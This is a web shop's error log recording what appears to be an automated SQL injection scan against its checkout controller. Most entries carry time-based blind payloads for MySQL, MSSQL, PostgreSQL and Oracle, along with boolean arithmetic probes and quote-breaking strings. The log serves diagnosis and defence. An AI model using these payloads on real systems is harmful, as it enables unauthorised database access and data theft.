*ERROR* 	2024/07/30 - 23:18:54: Unknown method "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:02: Unknown method "updateTOSStatusAndGetPayments-1 waitfor delay '0:0:15' -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:11: Unknown method "updateTOSStatusAndGetPaymentsWz3Vtm4v'; waitfor delay '0:0:15' -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:17: Unknown method "updateTOSStatusAndGetPaymentsQBArjhZt' OR 724=(SELECT 724 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:25: Unknown method "updateTOSStatusAndGetPaymentsiQdTwWu2') OR 689=(SELECT 689 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:34: Unknown method "updateTOSStatusAndGetPaymentsCFwWdGUb')) OR 22=(SELECT 22 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:43: Unknown method "updateTOSStatusAndGetPayments'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:44: Unknown method "updateTOSStatusAndGetPayments'"" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:44: Unknown method "updateTOSStatusAndGetPayments¿ß¿¢%2527%2522'"" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:19:44: Unknown method "@@Jirok" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:39: Unknown method "-1 OR 2+796-796-1=0+0+0+1 -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:39: Unknown method "-1 OR 3+796-796-1=0+0+0+1 -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:39: Unknown method "-1 OR 2+523-523-1=0+0+0+1" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:39: Unknown method "-1 OR 3+523-523-1=0+0+0+1" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:39: Unknown method "-1' OR 2+205-205-1=0+0+0+1 -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:39: Unknown method "-1' OR 3+205-205-1=0+0+0+1 -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:40: Unknown method "-1' OR 2+389-389-1=0+0+0+1 or 'BWNQPha6'='" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:40: Unknown method "-1' OR 3+389-389-1=0+0+0+1 or 'BWNQPha6'='" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:40: Unknown method "-1" OR 2+382-382-1=0+0+0+1 -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:40: Unknown method "-1" OR 3+382-382-1=0+0+0+1 -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:27:50: Unknown method "if(now()=sysdate(),sleep(15),0)" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:28:00: Unknown method "noMultiAddressDelivery0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:28:09: Unknown method "noMultiAddressDelivery0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:28:21: Unknown method "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:28:33: Unknown method "noMultiAddressDelivery-1 waitfor delay '0:0:15' -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:29:04: Unknown method "noMultiAddressDeliveryjH3Wk2nc'; waitfor delay '0:0:15' -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:29:44: Unknown method "noMultiAddressDeliveryV2PDFPht' OR 419=(SELECT 419 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:30:34: Unknown method "noMultiAddressDeliveryjVjaTvOJ') OR 427=(SELECT 427 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:31:31: Unknown method "noMultiAddressDeliveryLnzqyI8Y')) OR 349=(SELECT 349 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:32:00: Unknown method "noMultiAddressDelivery'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:32:01: Unknown method "noMultiAddressDelivery'"" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:32:01: Unknown method "noMultiAddressDelivery¿ß¿¢%2527%2522'"" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:32:01: Unknown method "@@29lb6" at line 315 in file controllers/front/OrderOpcController.php
